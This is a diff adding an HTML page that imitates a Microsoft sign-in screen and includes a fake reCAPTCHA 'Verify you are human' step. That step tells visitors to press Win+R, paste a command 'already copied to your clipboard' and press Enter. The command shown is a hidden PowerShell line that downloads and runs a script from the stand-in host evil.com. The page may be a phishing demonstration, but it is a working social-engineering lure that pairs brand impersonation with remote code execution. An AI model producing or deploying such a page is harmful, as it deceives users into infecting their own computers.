@@ -1,0 +1,102 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Sign in to your account</title>
+  <link rel="stylesheet" href="src/fakerecaptcha.css">
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Segoe+UI&display=swap">
+  <style>
+    body {
+      font-family: 'Segoe UI', sans-serif;
+      background-color: #f3f2f1;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+    .login-container {
+      background: #ffffff;
+      width: 340px;
+      padding: 40px 30px;
+      box-shadow: 0 0 8px rgba(0,0,0,0.1);
+    }
+    .login-logo {
+      width: 100px;
+      margin-bottom: 25px;
+    }
+    .login-title {
+      font-size: 20px;
+      margin-bottom: 20px;
+    }
+    input[type="text"], input[type="password"] {
+      width: 100%;
+      padding: 10px;
+      margin-top: 10px;
+      margin-bottom: 15px;
+      border: 1px solid #ccc;
+    }
+    .login-button {
+      background-color: #0078d4;
+      color: white;
+      border: none;
+      width: 100%;
+      padding: 10px;
+      font-weight: bold;
+      cursor: pointer;
+    }
+    .fkrc-container {
+      margin-top: 30px;
+    }
+  </style>
+</head>
+<body>
+
+<div class="login-container">
+  <img class="login-logo" src="https://logincdn.msauth.net/shared/1.0/content/images/microsoft_logo.svg" alt="Microsoft">
+  <div class="login-title">Sign in</div>
+  <form id="login-form" onsubmit="return false;">
+    <input type="text" placeholder="Email, phone, or Skype" required>
+    <input type="password" placeholder="Password" required>
+    <button type="submit" class="login-button">Sign in</button>
+  </form>
+
+  <!-- Fake reCAPTCHA Start -->
+  <div class="fkrc-container fkrc-m-p">
+    <div id="fkrc-checkbox-window" class="fkrc-checkbox-window fkrc-m-p fkrc-block">
+      <div class="fkrc-checkbox-container fkrc-m-p">
+        <button type="button" id="fkrc-checkbox" class="fkrc-checkbox fkrc-m-p fkrc-line-normal"></button>
+      </div>
+      <p class="fkrc-im-not-a-robot fkrc-m-p fkrc-line-normal">I'm not a robot</p>
+      <img src="images/captcha_logo.svg" class="fkrc-captcha-logo fkrc-line-normal" alt="">
+      <p class="fkrc-checkbox-desc fkrc-m-p fkrc-line-normal">CAPTCHA</p>
+      <p class="fkrc-checkbox-desc fkrc-m-p fkrc-line-normal">Privacy - Terms</p>
+      <img src="images/captcha_spinner.gif" class="fkrc-spinner fkrc-m-p fkrc-line-normal" alt="" id="fkrc-spinner" style="visibility:hidden;opacity:0;">
+    </div>
+
+    <div id="fkrc-verifywin-window" class="fkrc-verifywin-window" style="opacity:0;visibility:hidden;">
+      <div class="fkrc-verifywin-container">
+        <header class="fkrc-verifywin-header">
+          <span class="fkrc-verifywin-header-text-medium fkrc-m-p fkrc-block">Final security check</span>
+          <span class="fkrc-verifywin-header-text-big fkrc-m-p fkrc-block">Verify you are human</span>
+        </header>
+        <main class="fkrc-verifywin-main">
+          <p><strong>Step 1:</strong> Press <kbd>Win</kbd> + <kbd>R</kbd></p>
+          <p><strong>Step 2:</strong> Paste the command already copied to your clipboard</p>
+          <p><strong>Step 3:</strong> Press Enter</p>
+          <pre>powershell -w hidden -nop -c "IEX (New-Object Net.WebClient).DownloadString('https://evil.com/script.ps1')"</pre>
+        </main>
+      </div>
+      <footer class="fkrc-verifywin-container fkrc-verifywin-footer">
+        <div class="fkrc-verifywin-footer-left">Verification in progress...</div>
+      </footer>
+    </div>
+
+    <img src="images/captcha_arrow.svg" alt="" class="fkrc-verifywin-window-arrow" id="fkrc-verifywin-window-arrow" style="opacity:0;visibility:hidden;">
+  </div>
+  <!-- Fake reCAPTCHA End -->
+
+</div>
+
+<script src="src/fakerecaptcha.js"></script>
+</body>
+</html>
